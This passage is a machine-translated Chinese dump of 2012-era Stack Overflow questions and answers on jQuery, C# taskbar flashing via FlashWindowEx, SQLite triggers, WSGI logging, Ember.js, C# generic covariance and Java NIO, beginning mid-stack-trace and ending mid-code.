07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.os.Parcel.readException(Parcel.java:1218)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.os.Parcel.readException(Parcel.java:1206)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.net.IConnectivityManager$Stub$Proxy.getActiveNetworkInfo(IConnectivityManager.java:239)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.net.ConnectivityManager.getActiveNetworkInfo(ConnectivityManager.java:195)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at org.apache.cordova.NetworkManager.execute(NetworkManager.java:124)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at org.apache.cordova.api.PluginManager.exec(PluginManager.java:211)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at org.apache.cordova.CordovaChromeClient.onJsPrompt(CordovaChromeClient.java:207)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.webkit.CallbackProxy.handleMessage(CallbackProxy.java:539)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.os.Handler.dispatchMessage(Handler.java:99)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.os.Looper.loop(Looper.java:123)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at android.app.ActivityThread.main(ActivityThread.java:4363)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at java.lang.reflect.Method.invokeNative(Native Method)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at java.lang.reflect.Method.invoke(Method.java:521)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:860)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:618)

07-04 11:57:05.349: E/AndroidRuntime(1296):     at dalvik.system.NativeStart.main(Native Method)... 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T12:15:57.053

那是一些不必要的日志。它不会影响您的代码。[然而，我们伟大的西蒙](https://stackoverflow.com/users/41679/simon-macdonald)在这里提出了一个问题：）

[https://issues.apache.org/jira/browse/CB-995](https://issues.apache.org/jira/browse/CB-995)

还有一些其他问题导致您的应用程序被强制关闭。请发布更多日志。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-18T05:55:36.530

我只是通过更正 index.html 中的 cordova-1.9.0.js 文件的路径来修复相同的错误。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-11T03:23:37.580

如果它与我收到的错误类似，请检查以确保将 xml 文件夹从 Cordova 包复制到 /res 文件夹。我得到了与上面相同的错误，但这是一个红鲱鱼。导致应用程序强制关闭的真正问题是缺少 xml 文件夹。

# jquery - 使用 jquery 更改选定的索引

> ID：11309817
> 
> 赞同：17
> 
> 时间：2012-07-03T11:19:50.583
> 
> 标签：jquery

嗨，当另一个已更改时，您需要更改 a 的选定索引。示例：我有

```
<select id="selector">
<option>No 1</option>
<option>No 2</option>
</select>
<select id="selected">
<option>ONE</option>
<option>TWO</option>
</select> 
```

现在我希望在#selector 的索引更改时更改 $selected 索引。就像当我更改为“No 2”时，另一个组合框将更改为“TWO”。请原谅我的新手问题，但我是 jquery 的新手^^

* * *

## 回答 #1

> 赞同：36
> 
> 时间：2012-07-03T11:25:43.613

```
$('#selector').change(function() {
    var idx = this.selectedIndex;        
    $("select#selected").prop('selectedIndex', idx);  
}); 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-07-03T11:22:18.620

我建议：

```
$('#selector').change(
    function(){
        var index = this.selectedIndex;
        $('#selected option').eq(index).prop('selected',true);
    }); 
```

[JS 小提琴演示](http://jsfiddle.net/davidThomas/BeTmf/)。

参考：

*   [`change()`](http://api.jquery.com/change/).
*   [`eq()`](http://api.jquery.com/eq/).
*   [`prop()`](http://api.jquery.com/prop/).

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-07-03T11:24:43.227

只使用常规 JavaScript，因为 jQuery 似乎不需要这样做：

```
document.getElementById('selector').onchange = function() {
    document.getElementById('selected').selectedIndex = this.selectedIndex;
} 
```

[**工作演示**](http://jsfiddle.net/nJ55a/1/)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-07-03T11:30:55.617

使用**jQuery 1.7.2**

```
$(document).on('change', '#selector', function (){
   var si =  this.selectedIndex
    $('#selected option').eq(si).prop('selected',true);
});​ 
```

[工作演示](http://jsfiddle.net/zKsKV/)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2015-04-30T17:02:17.450

selectedIndex 从 0 开始。

如果下拉列表允许多选，它将仅返回所选第一个选项的索引。
值“-1”将取消选择所有选项（如果有）。
如果未选择任何选项，则 selectedIndex 属性将返回 -1。

```
$('#idselect').change(function() {
    var index = this.selectedIndex;
    //...
}); 
```

# java - .NET 代理类中的 Java Web 服务返回 null

> ID：11309819
> 
> 赞同：0
> 
> 时间：2012-07-03T11:19:51.987
> 
> 标签：java, .net, soap

当我在 .NET 代理类中访问 Java Web 服务时，我得到的回复字符串为空。

在 SOAP 扩展的帮助下，我发现这是我从 Web 服务得到的回复：

```
<?xml version="1.0" encoding="utf-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
    <soapenv:Body>
         <getInfoResponse xmlns="http://services">
             <getInfoReturn>
                 <full_Name xsi:nil="true"/>
             </getInfoReturn>
         </getInfoResponse>
    </soapenv:Body>
</soapenv:Envelope> 
```

这是我正在使用的客户端类

```
cardInfo = new global::CardInfoService.CardInfoService.CardInfoService(); 
card = cardInfo.getCardInfo(value, number); 
System.Console.WriteLine("Got the Card Holder name " + card.full_Name); 
```

提前致谢。

# jquery - 将 x 轴浮动为字符串

> ID：11309820
> 
> 赞同：0
> 
> 时间：2012-07-03T11:19:53.077
> 
> 标签：jquery, flot

这是我想用 flot 绘制的数据（jquery 库）

其中动作在 x 轴上，计数在 y 轴上

```
var data= [{"action":"QUERY INSURANCE","count":"9"},{"action":"QUERY POLICE DETAILS","count":"15"},{"action":"QUERY VEHICLE DETAILS","count":"3"},{"action":"CIVILIAN DETAILS","count":"1"},{"action":"LOGGING IN","count":"59"},{"action":"Report Occurrence","count":"1"},{"action":"QUERY CRIMINAL RECORDS","count":"2"},{"action":"QUERY VEHICLE OFFENCES","count":"2"},{"action":"QUERY DL VALIDITY","count":"5"},{"action":"REPORT OCCURRENCE","count":"23"}];

$.plot($("#plotrr"), [
    {
        data: data,
        bars: { show: true }

    }]); 
```

如何在 x 轴上显示“动作”，在 y 轴上显示“计数”

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-07-03T15:42:02.703

您需要做的是在 flot 选项中指定`ticks`参数并将您的每个操作设置为一个刻度。`xaxis`因此，您将执行 0 = 查询保险、1 = 查询警察详细信息等操作：

```
$.plot($("#plotrr"), [
    {
        data: [[0,9],[1,15] ... ], //fill out the rest of your counts sequentially here
        bars: { show: true }

    }], 
    //flot options
    {
        xaxis: {
           ticks: [[0,'Query Insurance'],[1,'Query Police Details'] ...] //fill out the rest here
        }
    }); 
```

另一个警告是，当您的计数应该是数字时，它们看起来像是字符串 - 即`count: "9"`是错误的，`count: 9`是正确的。

# vba - 根据主复选框选择切换选项卡中的复选框

> ID：11309825
> 
> 赞同：1
> 
> 时间：2012-07-03T11:20:07.523
> 
> 标签：vba, excel, checkbox

我在 vba 表单中的复选框的 onclick 事件中遇到问题。基本上我要做的是将特定选项卡上所有复选框的值修改为与主复选框相同的值。在这种情况下，它是下面的“使用在线”标题复选框（代码中的online_toggle），一旦单击该复选框，应将选项卡上的其他复选框切换为“打开”或“关闭”。我目前有以下代码，但它一直在“For Each obj In online.OLEObjects”处产生错误

![我的用户表单](../Images/39b6094f5ac29df176fcfa264c43e23e.png)

```
Private Sub online_toggle_Click()

Dim ctl As Control

For Each ctl In Me.MultiPage1.Pages(6).Controls

    If TypeOf ctl Is MSForms.CheckBox Then
        If ctl.GroupName = "online_variants" Then
        If ctl.Name <> "online_toggle" Then
            ctl.Value = online_toggle.Value
        End If
        End If
    End If

Next ctl

End Sub 
```

NB online 是所有复选框所在的选项卡的名称。如果它有助于受主复选框影响的复选框都被分组为 online_variants

干杯，

杰森

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:41:16.647

在 Mutipage 中，页码从 0 开始，因此如果您尝试引用`Online`选项卡（第 7 个选项卡）中的复选框，请使用此

```
Dim ctl As Control

For Each ctl In Me.MultiPage1.Pages(6).Controls
    If TypeOf ctl Is MSForms.CheckBox Then
        '~~> Your code here
        Debug.Print ctl.Name
    End If
Next 
```

# c# - 最小化时窗口应用程序在任务栏上像橙色一样闪烁

> ID：11309827
> 
> 赞同：44
> 
> 时间：2012-07-03T11:20:08.990
> 
> 标签：c#, asp.net, winforms, winapi

我有一个窗口应用程序。当我最小化任务栏上的窗口应用程序以处理另一个应用程序时。我们有一种工具可以将消息从一个窗口应用程序发送到另一个窗口应用程序。

所以我的第一个 win 应用程序被最小化，现在我打开我的另一个 win 应用程序，然后向第一个应用程序发送消息，但第一个应用程序在任务栏上。所以我想要这样的功能，比如当任何消息捕获我的第一个应用程序时，它会像 Skype 或任何信使一样闪烁。

我已经尝试过`FlashWindowEx`的方法`User32.dll`，但没有运气。我已经尝试使用“持续闪烁直到窗口出现在前台”选项。但没有运气。

请用一个例子帮我解决这个问题。

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-07-03T11:45:28.873

我这样做如下所示，确保添加所需的引用，如图所示

```
using System.Runtime.InteropServices;
using Microsoft.Win32;

// To support flashing.
[DllImport("user32.dll")]
[return: MarshalAs(UnmanagedType.Bool)]
static extern bool FlashWindowEx(ref FLASHWINFO pwfi);

//Flash both the window caption and taskbar button.
//This is equivalent to setting the FLASHW_CAPTION | FLASHW_TRAY flags. 
public const UInt32 FLASHW_ALL = 3;

// Flash continuously until the window comes to the foreground. 
public const UInt32 FLASHW_TIMERNOFG = 12;

[StructLayout(LayoutKind.Sequential)]
public struct FLASHWINFO
{
    public UInt32 cbSize;
    public IntPtr hwnd;
    public UInt32 dwFlags;
    public UInt32 uCount;
    public UInt32 dwTimeout;
}

// Do the flashing - this does not involve a raincoat.
public static bool FlashWindowEx(Form form)
{
    IntPtr hWnd = form.Handle;
    FLASHWINFO fInfo = new FLASHWINFO();

    fInfo.cbSize = Convert.ToUInt32(Marshal.SizeOf(fInfo));
    fInfo.hwnd = hWnd;
    fInfo.dwFlags = FLASHW_ALL | FLASHW_TIMERNOFG;
    fInfo.uCount = UInt32.MaxValue;
    fInfo.dwTimeout = 0;

    return FlashWindowEx(ref fInfo);
} 
```

这应该包含您需要的一切。

我希望这有帮助。

* * *

## 回答 #2

> 赞同：33
> 
> 时间：2012-07-03T11:40:09.583

[C#：任务栏中的 Flash 窗口通过 Win32 FlashWindowEx](https://pietschsoft.com/post/2009/01/26/csharp-flash-window-in-taskbar-via-win32-flashwindowex)它适用于我。

> Windows API (Win32) 在 User32 库中有 FlashWindowEx 方法；此方法允许您（开发人员）闪烁一个窗口，向用户表明应用程序中发生了需要他们注意的一些重大事件。最常见的用法是使窗口闪烁，直到用户将焦点返回到应用程序。但是，您也可以将窗口闪烁指定次数，或者只是继续闪烁，直到您决定何时停止。
> 
> 但是，FlashWindowEx 方法的使用并未内置到任何地方的 .NET Framework 中。为了访问它，您需要使用 .NET 的平台调用 (PInvoke) 功能“下拉”到 Windows API (Win32) 并直接调用它。此外，与 Windows API 中的许多其他功能（不直接由 .NET 公开）一样，如果您不熟悉在 .NET 中使用 Windows API，则使用 FlashWindowEx 方法可能会有些棘手。
> 
> 现在，与其深入探讨 PInvoke 或 Win32 FlashWindowEx 方法的细节，下面是一个简单的 C# 静态类，可让您轻松利用此方法。实际上需要相当多的信息来解释如何使用 PInvoke 来利用 Windows API (Win32)，所以我可能会在以后的文章中介绍这些信息。
> 
> 下面是这个静态类的一些示例用法：
> 
> ```
> // One this to note with this example usage code, is the "this" keyword is referring to
> // the current System.Windows.Forms.Form.
> 
> // Flash window until it recieves focus
> FlashWindow.Flash(this);
> 
> // Flash window 5 times
> FlashWindow.Flash(this, 5);
> 
> // Start Flashing "Indefinately"
> FlashWindow.Start(this);
> 
> // Stop the "Indefinate" Flashing
> FlashWindow.Stop(this); 
> ```
> 
> 关于 FlashWindowEx 方法需要注意的一点是，它需要（并且只能在）Windows 2000 或更高版本上运行。
> 
> 这是 C# 中静态类的代码：
> 
> ```
> public static class FlashWindow
> {
>     [DllImport("user32.dll")]
>     [return: MarshalAs(UnmanagedType.Bool)]
>     private static extern bool FlashWindowEx(ref FLASHWINFO pwfi);
>  
>     [StructLayout(LayoutKind.Sequential)]
>     private struct FLASHWINFO
>     {
>         /// <summary>
>         /// The size of the structure in bytes.
>         /// </summary>
>         public uint cbSize;
>         /// <summary>
>         /// A Handle to the Window to be Flashed. The window can be either opened or minimized.
>         /// </summary>
>         public IntPtr hwnd;
>         /// <summary>
>         /// The Flash Status.
>         /// </summary>
>         public uint dwFlags;
>         /// <summary>
>         /// The number of times to Flash the window.
>         /// </summary>
>         public uint uCount;
>         /// <summary>
>         /// The rate at which the Window is to be flashed, in milliseconds. If Zero, the function uses the default cursor blink rate.
>         /// </summary>
>         public uint dwTimeout;
>     }
>  
>     /// <summary>
>     /// Stop flashing. The system restores the window to its original stae.
>     /// </summary>
>     public const uint FLASHW_STOP = 0;
>     
>     /// <summary>
>     /// Flash the window caption.
>     /// </summary>
>     public const uint FLASHW_CAPTION = 1;
>     
>     /// <summary>
>     /// Flash the taskbar button.
>     /// </summary>
>     public const uint FLASHW_TRAY = 2;
>     
>     /// <summary>
>     /// Flash both the window caption and taskbar button.
>     /// This is equivalent to setting the FLASHW_CAPTION | FLASHW_TRAY flags.
>     /// </summary>
>     public const uint FLASHW_ALL = 3;
>  
>     /// <summary>
>     /// Flash continuously, until the FLASHW_STOP flag is set.
>     /// </summary>
>     public const uint FLASHW_TIMER = 4;
>  
>     /// <summary>
>     /// Flash continuously until the window comes to the foreground.
>     /// </summary>
>     public const uint FLASHW_TIMERNOFG = 12;
>  
>  
>     /// <summary>
>     /// Flash the spacified Window (Form) until it recieves focus.
>     /// </summary>
>     /// <param name="form">The Form (Window) to Flash.</param>
>     /// <returns></returns>
>     public static bool Flash(System.Windows.Forms.Form form)
>     {
>         // Make sure we're running under Windows 2000 or later
>         if (Win2000OrLater)
>         {
>             FLASHWINFO fi = Create_FLASHWINFO(form.Handle, FLASHW_ALL | FLASHW_TIMERNOFG, uint.MaxValue, 0);
>             return FlashWindowEx(ref fi);
>         }
>         return false;
>     }
>  
>     private static FLASHWINFO Create_FLASHWINFO(IntPtr handle, uint flags, uint count, uint timeout)
>     {
>         FLASHWINFO fi = new FLASHWINFO();
>         fi.cbSize = Convert.ToUInt32(Marshal.SizeOf(fi));
>         fi.hwnd = handle;
>         fi.dwFlags = flags;
>         fi.uCount = count;
>         fi.dwTimeout = timeout;
>         return fi;
>     }
>  
>     /// <summary>
>     /// Flash the specified Window (form) for the specified number of times
>     /// </summary>
>     /// <param name="form">The Form (Window) to Flash.</param>
>     /// <param name="count">The number of times to Flash.</param>
>     /// <returns></returns>
>     public static bool Flash(System.Windows.Forms.Form form, uint count)
>     {
>         if (Win2000OrLater)
>         {
>             FLASHWINFO fi = Create_FLASHWINFO(form.Handle, FLASHW_ALL, count, 0);
>             return FlashWindowEx(ref fi);
>         }
>         return false;
>     }
>  
>     /// <summary>
>     /// Start Flashing the specified Window (form)
>     /// </summary>
>     /// <param name="form">The Form (Window) to Flash.</param>
>     /// <returns></returns>
>     public static bool Start(System.Windows.Forms.Form form)
>     {
>         if (Win2000OrLater)
>         {
>             FLASHWINFO fi = Create_FLASHWINFO(form.Handle, FLASHW_ALL, uint.MaxValue, 0);
>             return FlashWindowEx(ref fi);
>         }
>         return false;
>     }
>  
>     /// <summary>
>     /// Stop Flashing the specified Window (form)
>     /// </summary>
>     /// <param name="form"></param>
>     /// <returns></returns>
>     public static bool Stop(System.Windows.Forms.Form form)
>     {
>         if (Win2000OrLater)
>         {
>             FLASHWINFO fi = Create_FLASHWINFO(form.Handle, FLASHW_STOP, uint.MaxValue, 0);
>             return FlashWindowEx(ref fi);
>         }
>         return false;
>     }
>  
>     /// <summary>
>     /// A boolean value indicating whether the application is running on Windows 2000 or later.
>     /// </summary>
>     private static bool Win2000OrLater
>     {
>         get { return System.Environment.OSVersion.Version.Major >= 5; }
>     }
> } 
> ```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2017-08-31T10:35:48.700

我知道这个问题已经很老了，但是根据 MoonKnight 的回答，我做了一个改进，有些人可能会觉得有用。我将其转换为表单扩展。

```
public static class ExtensionMethods
{
    // To support flashing.
    [DllImport("user32.dll", CallingConvention = CallingConvention.Cdecl)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool FlashWindowEx(ref FLASHWINFO pwfi);

    //Flash both the window caption and taskbar button.
    //This is equivalent to setting the FLASHW_CAPTION | FLASHW_TRAY flags. 
    private const uint FLASHW_ALL = 3;

    // Flash continuously until the window comes to the foreground. 
    private const uint FLASHW_TIMERNOFG = 12;

    [StructLayout(LayoutKind.Sequential)]
    private struct FLASHWINFO
    {
        public uint cbSize;
        public IntPtr hwnd;
        public uint dwFlags;
        public uint uCount;
        public uint dwTimeout;
    }

    /// <summary>
    /// Send form taskbar notification, the Window will flash until get's focus
    /// <remarks>
    /// This method allows to Flash a Window, signifying to the user that some major event occurred within the application that requires their attention. 
    /// </remarks>
    /// </summary>
    /// <param name="form"></param>
    /// <returns></returns>
    public static bool FlashNotification(this Form form)
    {
        IntPtr hWnd = form.Handle;
        FLASHWINFO fInfo = new FLASHWINFO();

        fInfo.cbSize = Convert.ToUInt32(Marshal.SizeOf(fInfo));
        fInfo.hwnd = hWnd;
        fInfo.dwFlags = FLASHW_ALL | FLASHW_TIMERNOFG;
        fInfo.uCount = uint.MaxValue;
        fInfo.dwTimeout = 0;

        return FlashWindowEx(ref fInfo);
    }
} 
```

要在表单上使用它，您只需调用

```
this.FlashNotification(); 
```

要更改它的闪烁方式，只需查看[此表](https://msdn.microsoft.com/en-us/library/windows/desktop/ms679348(v=vs.85).aspx#FLASHW_ALL)

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2014-06-27T15:40:06.163

伙计们，我找到了一种更简单的方法！如果是这种情况，您正在使用它。

在 .NET 4.0、C# 中，如果您只是使用

```
this.WindowState = FormWindowState.Normal;
this.Activate(); 
```

第一行确保它没有被最小化，第二行使它成为焦点。我不确定确切的原因（其中任何一个都不这样做），但结合起来，如果你从这个表单中显示一个 MessageBox，你的程序会在任务栏中闪烁橙色！

# android - Android - SQLite Trigger vs Java SQL insert，哪个更高效？

> ID：11309838
> 
> 赞同：3
> 
> 时间：2012-07-03T11:20:31.960
> 
> 标签：android, sql, database, triggers

我想在表中插入一行，当我进行插入时，我想同时在另一个表中插入另一行。

在 Android 应用程序中执行此操作的更有效方法是什么？

当我插入一行并且 SQL 负责插入时执行触发器更有效，还是在 Java 中使用 database.insert() 执行两次插入？

插入第二行所需的信息已经在第一次插入中。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-03T11:37:00.503

> 我想在表中插入一行，当我进行插入时，我想同时在另一个表中插入另一行。

肯定会使用这个`TRIGGER`，因为它在数据库层上工作，所以你只需要创建它，然后当你做某事时它会被调用（取决于你如何实现触发器）。

它也更快，你不要明确地称之为，让数据库工作。数据库能做的一切，让我们在数据库上做。

**更新：**

*因此，在与@Graham Borland*进行一些讨论后，您还可以使用 inserts in `TRANSACTION`。
看看[Android 数据库事务](https://stackoverflow.com/questions/8147440/android-database-transaction)。

*结论是什么更快？*

我完全不知道，因为我没有进行性能测试，但`TRANSACTIONS`我认为肯定是最安全的，但是否比`TRIGGERS`这更快，我不知道，但使用事务非常好，主要是防止数据库访问的安全方法非常不受欢迎的不正确状态。

# python - 如何调试/记录 wsgi python 应用程序？

> ID：11309840
> 
> 赞同：6
> 
> 时间：2012-07-03T11:20:44.983
> 
> 标签：python, debugging, logging, wsgi

我试过这个：

```
#!/usr/bin/python    

from wsgiref.simple_server import make_server
from cgi import parse_qs, escape
import logging
import os
import sys

html = """
<html>
<body>
   <form method="post" action="parsing_post.wsgi">
      <p>
         Age: <input type="text" name="age">
         </p>
      <p>
         Hobbies:
         <input name="hobbies" type="checkbox" value="software"> Software
         <input name="hobbies" type="checkbox" value="tunning"> Auto Tunning
         </p>
      <p>
         <input type="submit" value="Submit">
         </p>
      </form>
   <p>
      Age: %s<br>
      Hobbies: %s
      </p>
   </body>
</html>
"""

def application(environ, start_response):

   # the environment variable CONTENT_LENGTH may be empty or missing
   try:
      request_body_size = int(environ.get('CONTENT_LENGTH', 0))
   except (ValueError):
      request_body_size = 0

   # When the method is POST the query string will be sent
   # in the HTTP request body which is passed by the WSGI server
   # in the file like wsgi.input environment variable.
   logger = logging.getLogger(__name__)
   request_body = environ['wsgi.input'].read(request_body_size)
   d = parse_qs(request_body)

   age = d.get('age', [''])[0] # Returns the first age value.
   hobbies = d.get('hobbies', []) # Returns a list of hobbies.

   # Always escape user input to avoid script injection
   age = escape(age)
   hobbies = [escape(hobby) for hobby in hobbies]

   response_body = html % (age or 'Empty',
               ', '.join(hobbies or ['No Hobbies']))

   status = '200 OK'

   response_headers = [('Content-Type', 'text/html'),
                  ('Content-Length', str(len(response_body)))]
   start_response(status, response_headers)

   return [response_body] 
```

但我不知道它记录在哪里。我正在尝试在网页或文件 /var/log/apache2/myapp.log 中显示/记录值

最好的方法是什么？

任何答案将不胜感激。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-03T11:34:48.040

请注意，上面的代码实际上不会产生任何日志，因为您没有调用任何`logger.log()`变体 - 但我想这不是重点。

如果您使用 apache/mod_wsgi 运行代码，最简单的解决方案是配置您的记录器以使用 StreamHandler 记录到 sys.stderr（参见 [http://docs.python.org/howto/logging.html#配置日志](http://docs.python.org/howto/logging.html#configuring-logging)），并在您的 apache conf 中定义错误日志路径、名称和级别（请注意，默认的 apache 行为是仅记录“错误级别”消息）。

# c# - 使用生成的决策树来预测新的输入

> ID：11309849
> 
> 赞同：5
> 
> 时间：2012-07-03T11:21:13.203
> 
> 标签：c#, decision-tree, accord.net

我想使用accord.net 框架从一组数据中生成决策树。

我阅读了此链接中的指南[http://crsouza.blogspot.com/2012/01/decision-trees-in-c.html](http://crsouza.blogspot.com/2012/01/decision-trees-in-c.html)

我能够通过跟随它来生成树。但是如何使用它来预测新的输入？

我的意思是在创建树之后我想使用它（作为 if-else 语句来了解新输入的输出）

据说我可以将其转换为表达式 `var expression = tree.ToExpression();`，但我该如何使用它？

谢谢你的帮助

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-06T21:00:53.957

我建议您仔细阅读指南中的示例。在程序的最后，他们生成[表达式树](http://msdn.microsoft.com/en-us/library/bb397951.aspx)并`var expression = tree.ToExpression();` **对其进行编译**：

`var func = expression.Compile();`

结果是一个委托，您可以简单地执行它以获得给定输入的决定。在示例中，您可以执行类似的操作

`bool willPlayTennis = func(new double[] {1.0, 1.0, 1.0, 1.0}) == 1;`

# permissions - 如何更改 Pantheios 日志文件的权限

> ID：11309851
> 
> 赞同：0
> 
> 时间：2012-07-03T11:21:18.630
> 
> 标签：permissions, pantheios

我使用 Pantheios 作为我的伐木甜品。使用它的进程当前归root所有，它创建的日志文件不会为所有用户创建具有读取权限的进程：-rwxr-x---, 1 root root process.log

如何强制创建文件对每个人都可读？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-06T11:36:13.277

使用[umask 函数](http://pubs.opengroup.org/onlinepubs/009696899/functions/umask.html)为新创建的文件设置默认权限。

# ember.js - 创建视图时“无法调用未定义的方法'扩展'”

> ID：11309852
> 
> 赞同：0
> 
> 时间：2012-07-03T11:21:19.293
> 
> 标签：ember.js

我第一次尝试使用 Ember.js，并且遇到了第一个障碍。多年来一直试图让它工作，但我不断收到错误“无法调用未定义的方法'扩展'”

在我的 HTML 中，我有这个：

```
<script type="text/x-handlebars">
    {{#view App.MainView}}
      <div class="hero-unit">
        <h1>{{blogTitle}}</h1>
        <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Curabitur non neque a eros dapibus posuere. Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.</p>
      </div>
    {{/view}}
  </script> 
```

在我的 JS 中，我有这个：

```
var App = Ember.Application.create();

//define main view
App.MainView = Ember.View.extend({
    blogTitle: 'Epic Blog'
}); 
```

根据文档，这应该只是渲染模板很好，但无论我努力锄头，我都会得到错误......

有人知道我在做什么错吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-03T11:31:38.620

您使用的是什么 Ember.js 版本？我已经使用 Ember.js 0.9.8.1 使用您的代码创建了一个 JSFiddle，它可以工作，请参阅[http://jsfiddle.net/pangratz666/D3VuA/](http://jsfiddle.net/pangratz666/D3VuA/)。

此外，您必须`App`通过省略`var`. 这是必需的，以便模板中的绑定和路径起作用：

```
App = Ember.Application.create();
... 
```

# c# - C# 泛型和接口

> ID：11309854
> 
> 赞同：2
> 
> 时间：2012-07-03T11:21:31.697
> 
> 标签：c#, generics, inheritance, interface

有可能实现这样的事情吗？我在类 SomeClass 的声明中遇到此代码的问题。

我收到的例外是：

> “WindowsFormsApplication1.SomeClass”未实现接口成员“WindowsFormsApplication1.IB.SomeGetter”。“WindowsFormsApplication1.SomeClass.SomeGetter”无法实现“WindowsFormsApplication1.IB.SomeGetter”，因为它没有匹配的返回类型“WindowsFormsApplication1.MyClass”。

我的代码：

```
public interface IA
{ }

public interface IB
{
    MyClass<IA> SomeGetter { get; }
}

public class A : IA
{ }

public class MyClass<T>
    where T : IA
{ }

public class SomeClass : IB
{
    public MyClass<A> SomeGetter
    {
        get { return new MyClass<A>(); }
    }
} 
```

知道怎么做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-03T11:24:33.897

为此，您需要引入一个接口 ( `MyInterface`) 来利用[协方差](http://blogs.msdn.com/b/csharpfaq/archive/2010/02/16/covariance-and-contravariance-faq.aspx)：

```
public interface IA
{ }

public interface IB
{
    MyInterface<IA> SomeGetter { get; }
}

public class A : IA
{ }

public interface MyInterface<out T>
    where T : IA
{ }

public class MyClass<T> : MyInterface<T> where T : IA
{ }

public class SomeClass : IB
{
    public MyInterface<IA> SomeGetter
    {
        get { return new MyClass<A>(); }
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-03T11:32:16.887

你可能想为 MyClass 引入一个接口：

```
public interface IMyClass<out T> where T : IA
{

}

class MyClass<T> : IMyClass<T> where T : IA
{
} 
```

注意界面中的“out”关键字。然后你可以写

```
public class SomeClass : IB
{
    public IMyClass<A> SomeGetter
    {
        get { return new MyClass<A>(); }
    }
} 
```

# blackberry-eclipse-plugin - 在黑莓中设置多种字体

> ID：11309855
> 
> 赞同：1
> 
> 时间：2012-07-03T11:21:35.100
> 
> 标签：blackberry-eclipse-plugin

如何在黑莓中设置多种字体？实际上，我们正在使用以下代码将自定义字体加载到我们的应用程序中。

```
InputStream is = this.getClass().getResourceAsStream("/Text-Italic.ttf");
FontManager.getInstance().load(is, "Text-Italic",
FontManager.APPLICATION_FONT) ; 
```

如果我想设置另一种字体，我是否必须卸载当前字体？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-13T18:52:20.067

不，您不必卸载当前字体。您可以添加其他自定义字体。

谢谢

纳文 M

# java - Java NIO从远程机器读写

> ID：11309858
> 
> 赞同：0
> 
> 时间：2012-07-03T11:21:41.383
> 
> 标签：java, networking, tcp, nio

我想使用 NIO 向/从远程机器发送/接收数据。我可以随时发送或接收数据，当我需要发送数据时，我只是发送它而不需要来自远程机器的任何查询，并且远程机器会定期向我发送数据。我不了解 NIO 机制。什么会在 Selector SelectionKey 上生成和读取或写入事件？是否可以在我这边只使用一个 ServerSocketChannel 从远程机器读取数据并写入数据？这就是我所理解的，但我不明白如何触发写作事件......谢谢你的解释。

我已经做了一些编码，我可以读取来自远程机器的数据，但不能写入。我使用选择器，但我不知道如何写入数据。从未写入记录的消息“handle write”，但在wireshark中我可以看到我的数据包。

```
 public class ServerSelector {

    private static final Logger logger = Logger.getLogger(ServerSelector.class.getName());
    private static final int TIMEOUT = 3000; // Wait timeout (milliseconds)
    private static final int MAXTRIES = 3;
    private final Selector selector;

    public ServerSelector(Controller controller, int... servPorts) throws IOException {
        if (servPorts.length <= 0) {
            throw new IllegalArgumentException("Parameter(s) : <Port>...");
        }
        Handler consolehHandler = new ConsoleHandler();
        consolehHandler.setLevel(Level.INFO);
        logger.addHandler(consolehHandler);

        // Create a selector to multiplex listening sockets and connections
        selector = Selector.open();

        // Create listening socket channel for each port and register selector
        for (int servPort : servPorts) {
            ServerSocketChannel listnChannel = ServerSocketChannel.open();
            listnChannel.socket().bind(new InetSocketAddress(servPort));

            listnChannel.configureBlocking(false); // must be nonblocking to register
            // Register selector with channel.  The returned key is ignored
            listnChannel.register(selector, SelectionKey.OP_ACCEPT);
        }

        // Create a handler that will implement the protocol
        IOProtocol protocol = new IOProtocol();

        int tries = 0;
        // Run forever, processing available I/O operations
        while (tries < MAXTRIES) {
            // Wait for some channel to be ready (or timeout)
            if (selector.select(TIMEOUT) == 0) { // returns # of ready chans
                System.out.println(".");
                tries += 1;
                continue;
            }

            // Get iterator on set of keys with I/O to process
            Iterator<SelectionKey> keyIter = selector.selectedKeys().iterator();
            while (keyIter.hasNext()) {
                SelectionKey key = keyIter.next(); // Key is a bit mask
                // Server socket channel has pending connection requests?
